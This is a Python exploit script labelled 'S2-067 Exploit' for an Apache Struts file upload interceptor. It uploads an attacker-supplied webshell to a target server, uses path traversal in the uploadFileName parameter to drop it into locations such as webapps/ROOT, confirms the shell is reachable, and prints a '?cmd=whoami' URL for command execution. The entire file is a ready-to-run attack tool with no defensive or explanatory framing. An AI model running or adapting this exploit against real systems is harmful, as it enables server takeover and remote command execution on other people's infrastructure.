import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string
import os


def upload_file(target_url, upload_endpoint, webshell_path, destination_path, allowed_types=None, allowed_extensions=None, simulate_i18n=False):
    """
    Upload a file to the target using parameter overwrite and path traversal.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading file to {upload_url}...")

    headers = {"User-Agent": "Mozilla/5.0"}
    with open(webshell_path, "rb") as f:
        webshell_content = f.read()

    files_payload = {
        "upload": (os.path.basename(webshell_path), webshell_content, "application/octet-stream"),
        "uploadFileName": destination_path
    }

    if simulate_i18n:
        simulate_i18n_errors()

    # Simulate MIME type and extension restrictions
    if allowed_types:
        headers["Content-Type"] = allowed_types
    if allowed_extensions and not destination_path.endswith(tuple(allowed_extensions)):
        print(f"[WARNING] File extension {destination_path.split('.')[-1]} might not be allowed.")

    try:
        m = MultipartEncoder(fields=files_payload, boundary='----WebKitFormBoundary' + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=16)))
        headers["Content-Type"] = m.content_type

        response = requests.post(upload_url, headers=headers, data=m, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] File uploaded successfully: {destination_path}")
            verify_uploaded_file(target_url, destination_path)
        else:
            print(f"[ERROR] Upload failed. HTTP {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")


def verify_uploaded_file(target_url, file_path):
    """Verify if the uploaded file is accessible."""
    file_url = urljoin(target_url, file_path)
    print(f"[INFO] Verifying uploaded file: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200:
            print(f"[ALERT] File uploaded and accessible: {file_url}?cmd=whoami")
        else:
            print(f"[INFO] File not accessible. HTTP Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")


def simulate_i18n_errors():
    """Simulate i18n file error handling scenarios."""
    errors = {
        "struts.messages.error.uploading": "Error uploading file.",
        "struts.messages.error.file.too.large": "The file size exceeds the maximum limit.",
        "struts.messages.error.content.type.not.allowed": "The file type is not allowed.",
        "struts.messages.error.file.extension.not.allowed": "The file extension is not allowed."
    }
    for key, message in errors.items():
        print(f"[I18N SIMULATION] {key}: {message}")


def predefined_paths():
    """Return a list of common test paths for path traversal."""
    return [
        "../../../../../webapps/ROOT/test.jsp",
        "/tmp/webshell.jsp",
        "/var/www/html/shell.jsp"
    ]


def main():
    parser = argparse.ArgumentParser(description="S2-067 Exploit - Testing Deprecated File Upload Interceptor")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Path to upload endpoint (e.g., /uploads.action)")
    parser.add_argument("--webshell", required=True, help="Path to WebShell file")
    parser.add_argument("-s", "--single", help="Single target path for testing (e.g., ../../../../../webapps/ROOT/webshell.jsp)")
    parser.add_argument("-d", "--directory", nargs="+", help="Multiple target paths for testing")
    parser.add_argument("-p", "--predefined", action="store_true", help="Use predefined common paths")
    parser.add_argument("--allowed_types", help="Simulated allowed MIME types (e.g., application/octet-stream)")
    parser.add_argument("--allowed_extensions", nargs="+", help="Simulated allowed file extensions (e.g., .jsp, .txt)")
    parser.add_argument("--simulate_i18n", action="store_true", help="Simulate i18n error handling scenarios")
    args = parser.parse_args()

    if args.single:
        upload_file(
            target_url=args.url,
            upload_endpoint=args.upload_endpoint,
            webshell_path=args.webshell,
            destination_path=args.single,
            allowed_types=args.allowed_types,
            allowed_extensions=args.allowed_extensions,
            simulate_i18n=args.simulate_i18n
        )
    elif args.directory:
        for path in args.directory:
            upload_file(
                target_url=args.url,
                upload_endpoint=args.upload_endpoint,
                webshell_path=args.webshell,
                destination_path=path,
                allowed_types=args.allowed_types,
                allowed_extensions=args.allowed_extensions,
                simulate_i18n=args.simulate_i18n
            )
    elif args.predefined:
        for path in predefined_paths():
            upload_file(
                target_url=args.url,
                upload_endpoint=args.upload_endpoint,
                webshell_path=args.webshell,
                destination_path=path,
                allowed_types=args.allowed_types,
                allowed_extensions=args.allowed_extensions,
                simulate_i18n=args.simulate_i18n
            )
    else:
        print("[ERROR] No testing mode selected. Use -s, -d, or -p.")
        parser.print_help()


if __name__ == "__main__":
    main()
